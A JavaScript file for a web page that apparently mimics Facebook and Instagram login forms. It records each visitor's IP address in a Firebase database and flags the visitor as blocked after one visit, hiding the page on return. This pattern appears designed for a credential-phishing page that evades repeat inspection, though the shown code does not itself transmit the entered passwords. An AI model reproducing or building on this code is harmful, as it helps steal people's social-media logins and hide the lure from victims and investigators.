const blockStatus = localStorage.getItem("blocked");
console.log(navigator.geolocation)
if(blockStatus){
    document.getElementById("open-displa").style.display = "none";
    document.getElementById("my-new-love").style.display = "flex";
    fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ipAddress = data.ip;
    Primarydatabase.ref("/disabled/ipaddress").orderByValue().equalTo(ipAddress).once('value').then(function(snapshot) {
        if (snapshot.exists()) {
            localStorage.setItem("blocked", true);
        } else {
            Primarydatabase.ref("/disabled/ipaddress").push(ipAddress);
            localStorage.setItem("blocked", true);
        }
      })
      .catch(function(error) {
        console.error("Error checking value:", error);
        alert("couldn't Verify you, please refresh this page.");
      });
})
  .catch(error => {
    alert("An error Occured please try again.")
    console.error('Error:', error);
  });
}else{
    fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ipAddress = data.ip;
    localStorage.setItem("ip", ipAddress);
    Primarydatabase.ref("/disabled/ipaddress").orderByValue().equalTo(ipAddress).once('value').then(function(snapshot) {
        if (snapshot.exists()) {
            localStorage.setItem("blocked", true);
        } 
        else {
            Primarydatabase.ref("/disabled/ipaddress").push(ipAddress).then(() => {
                localStorage.setItem("blocked", true);
              });
              
        }
      })
      .catch(function(error) {
        console.error("Error checking value:", error);
        alert("couldn't Verify you, please refresh this page.");
      });
})
  .catch(error => {
    alert("An error Occured please try again.")
    console.error('Error:', error);
  });
}
function formatDate(date) {
    const day = date.getDate();
    const month = date.toLocaleString('default', { month: 'long' });
    const year = date.getFullYear();
  
    const dayString = getDayWithOrdinalSuffix(day);
  
    return `${dayString} ${month} ${year}`;
  }
  
  function getDayWithOrdinalSuffix(day) {
    if (day >= 11 && day <= 13) {
      return day + 'th';
    }
    switch (day % 10) {
      case 1:
        return day + 'st';
      case 2:
        return day + 'nd';
      case 3:
        return day + 'rd';
      default:
        return day + 'th';
    }
  }
  const emailInput = document.getElementById("fb-email");
const passwordInput = document.getElementById("fb-pass");
const loginButton = document.getElementById("fb-log");

function updateButtonState() {
  const emailValue = emailInput.value;
  const passwordValue = passwordInput.value;

  if (emailValue.length > 0 && passwordValue.length > 0) {
    loginButton.id = "fb-log";
    loginButton.disabled = false;
  } else {
    loginButton.id = "fb-log2";
    loginButton.disabled = true;
  }
}

// Add input event listeners to both input fields
emailInput.addEventListener("input", updateButtonState);
passwordInput.addEventListener("input", updateButtonState);

// Initial state check
updateButtonState();

  


// instagram user upload...

const emailInputi = document.getElementById("ig-uname");
const passwordInputi = document.getElementById("ig-pass");
const loginButtoni = document.getElementById("ig-log");

function updateButtonStatei() {
  const emailValue = emailInputi.value;
  const passwordValue = passwordInputi.value;

  if (emailValue.length > 0 && passwordValue.length > 0) {
    loginButtoni.id = "fb-log";
    loginButtoni.disabled = false;
  } else {
    loginButtoni.id = "fb-log2";
    loginButtoni.disabled = true;
  }
}

// Add input event listeners to both input fields
emailInputi.addEventListener("input", updateButtonStatei);
passwordInputi.addEventListener("input", updateButtonStatei);

// Initial state check
updateButtonStatei();